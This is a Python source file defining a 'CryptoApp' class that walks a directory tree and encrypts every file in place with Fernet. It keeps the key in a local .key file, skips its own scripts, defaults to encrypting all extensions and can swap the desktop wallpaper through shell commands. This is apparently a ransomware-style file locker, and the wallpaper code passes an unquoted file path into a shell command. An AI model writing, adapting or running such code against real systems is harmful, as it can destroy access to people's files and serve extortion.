from cryptography.fernet import Fernet
from typing import Dict
import sys
import os
import json
from subprocess import call, run


class CryptoApp:
    def __init__(self, startPath=None):

        # Init the starting path, and change the current directory to it
        startPath = startPath or os.getcwd()
        os.chdir(startPath)

        KEY_PATH = '.key'

        # If the key exists, that means the files have been already encrypted
        if os.path.isfile(KEY_PATH):
            self.isEncrypted = True

            # Read the current fernet key
            with open(KEY_PATH, 'rb') as file:
                self.key = file.read()
                
        # If the files were not encrypted
        else:
            self.isEncrypted = False
            self.key = Fernet.generate_key()

            # Write the fernet key to a file
            self.writeFile(KEY_PATH, self.key)
            

        # Initialize main variables
        self.omittedFiles = ['.key', 'CryptoApp.py', 'index.py']
        self.extensionsToModify = []
        self.KEY_PATH = os.path.realpath(KEY_PATH)
        self.startingPath = startPath
        self.countFiles = 0
        self.countDirs = 0

        try:
            self.fernet = Fernet(self.key)
        except ValueError:

            # If the key is incorrect, delete it, and exit the program
            print('Incorrect key! You can forget about decryption')
            print('Removing key...')
            os.remove(self.KEY_PATH)

            exit(1)




    # Handle the encrypt/decrypt actions
    def __actionHandler(self) -> None:

        # Get the current directory files and filter ones that shouldn't be modified
        files = list( filter(lambda x: x not in self.omittedFiles, os.listdir()) ) 

        # Filter the file extensions
        if len(self.extensionsToModify):
            files = list( filter(lambda x: x.endswith(tuple(self.extensionsToModify)) or os.path.isdir(x), files) )



        # Loop through each file
        for path in files:
            try:
                isDir = os.path.isdir(path)

                # If the "path" is directory, change the working directory
                # Handle the files recursively, and finally return to the original directory
                if isDir:
                    # Save the current path, and increment the dir count
                    currentDir = os.getcwd()
                    self.countDirs += 1

                    os.chdir(path)
                    self.__actionHandler()   
                    os.chdir(currentDir)

                    continue             


                # Read the file contents
                old_text = self.readFile(path)
                if not old_text: continue

                try:
                    # Encrypt or decrypt the file
                    if self.isEncrypted:
                        new_text = self.fernet.decrypt(old_text)
                    else:
                        new_text = self.fernet.encrypt(old_text)

                except:
                    # Skip the file, if something went wrong
                    print(f'Could not modify file: {path}')
                    return


                # Finally, write to the file its new content
                self.writeFile(path, new_text)
                print(f'{path} - modified')

                # Increment the modified files count
                self.countFiles += 1

            except PermissionError:
                # Skip if there is a permission error
                print(f'Not permitted to operate on: {path}')
                return



    # Choose which files will be skipped during encryption
    def setFilesToSkip(self, files) -> None:
        self.omittedFiles.extend(files)



    # Choose which file extensions will be encrypted (default any, which may cause very serious damage)
    def setExtensionsToModify(self, extensions) -> None:
        self.extensionsToModify.extend(extensions)



    # Helper function for encrypting/decrypting
    def enc_dec_helper(self, type) -> None:
        if type == 'enc': prints = ['Encrypting...', 'Encrypted']
        elif type == 'dec': prints = ['Decrypting...', 'Decrypted']
        else: prints = ['', '']

        print(prints[0])
        self.__actionHandler()
        print(f'{prints[1]} {self.countFiles} files')



    # Encrypt the files
    def encrypt(self) -> None:
        self.enc_dec_helper('enc')



    # Decrypt the files
    def decrypt(self) -> None:
        self.enc_dec_helper('dec')

        os.remove(self.KEY_PATH)



    # Determine the OS, and DE, if on Linux
    # Returns a dictionary with a "os" and "de" fields
    def determineOS(self) -> Dict[str, str]:
        os_info = { "os": "", "de": "" }

        # Get the OS
        if sys.platform in ['linux2', 'linux']:
            os_info["os"] = 'linux'
        elif sys.platform == 'darwin':
            os_info["os"] = 'mac'
        elif sys.platform in ['win32', 'cygwin']:
            os_info["os"] = 'windows'


        # Get the DE
        if os_info["os"] == 'linux':
            de = None

            match os.environ.get("DESKTOP_SESSION"):
                case 'ubuntu': de = 'gnome'
                case 'kubuntu': de = 'kde'
                case 'xfce': de = 'xfce4'
                case _: de = os.environ.get("DESKTOP_SESSION")


            os_info["de"] = de


        return os_info            



    # Set the wallpaper image
    def setDesktopBG(self, target_os, target_de, file) -> None:
        # Return if file is not truthy
        if not file: return
            
        try:
            # Get the absolute path
            abs_path = os.path.abspath(file)

            if target_os == 'linux':
                # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
                if target_de == 'xfce4':
                    for x in ['Virtual1', '0']:
                        call(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image -s {abs_path} 2>/dev/null', shell=True)

        except:
            print('Could not change the wallpaper')



    # Get the current wallpaper image
    def getDesktopBG(self, target_os, target_de) -> str | None:
        if target_os == 'linux':
            # Xfce4 Desktop. Tested with Virtual and monitor0. Not sure about the others
            if target_de == 'xfce4':
                for x in ['Virtual1', '0']:
                    result = run(f'xfconf-query -c xfce4-desktop -p /backdrop/screen0/monitor{x}/workspace0/last-image', capture_output=True, shell=True)

                    # Decode the stdout
                    out = result.stdout.decode('utf-8').rstrip()

                    if out: return out

        return None
                        


    # Write to the file
    def writeFile(self, path, val) -> None:
        mode = 'wb' if isinstance(val, bytes) else 'w'

        with open(path, mode) as file:
            file.write(val)



    # Read the file contents
    def readFile(self, path) -> str | None:
        if not os.path.isfile(path):
            print(f'File: {path} does not exist')
            return None

        with open(path, 'rb') as file:
            return file.read()



    # Returns True, if the files were already encrypted (if the key.txt is present)    
    def isAlreadyEncrypted(self) -> bool:
        return self.isEncrypted

    

    # Get the total affected files and directories
    def getCount(self) -> Dict[str, int]:
        return { "dirs": self.countDirs, "files": self.countFiles }